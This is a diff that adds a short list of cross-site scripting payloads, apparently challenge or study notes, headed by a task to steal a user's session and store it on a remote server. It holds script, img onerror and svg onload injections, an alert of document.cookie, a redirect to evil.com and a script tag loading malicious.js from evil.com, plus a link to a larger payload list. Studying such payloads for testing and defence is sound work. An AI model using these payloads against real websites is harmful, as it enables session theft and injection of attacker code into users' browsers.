@@ -1,0 +1,30 @@
+Cross Site Scripting Payload 
+@Challenge - Craft an XSS payload to steal a user's session and store it on a remote server.
+
+<!-- Injecting an alert -->
+<script>alert('XSS')</script>
+
+<!-- Injecting an alert with encoded characters -->
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+<!-- Injecting an image tag with a JavaScript event -->
+<img src="#" onerror="alert('XSS')">
+
+<!-- Injecting an alert to steal cookies -->
+<script>alert(document.cookie)</script>
+
+<!-- Injecting a script tag to redirect the page -->
+<script>window.location='http://evil.com'</script>
+
+<!-- Injecting a payload to execute arbitrary JavaScript -->
+<svg/onload=alert('XSS')>
+
+<!-- Injecting a payload to steal user input -->
+<input type="text" oninput="alert(this.value)">
+
+<!-- Injecting a payload to execute JavaScript from an external source -->
+<script src="http://evil.com/malicious.js"></script>
+
+
+-- Others
+https://github.com/payloadbox/xss-payload-list
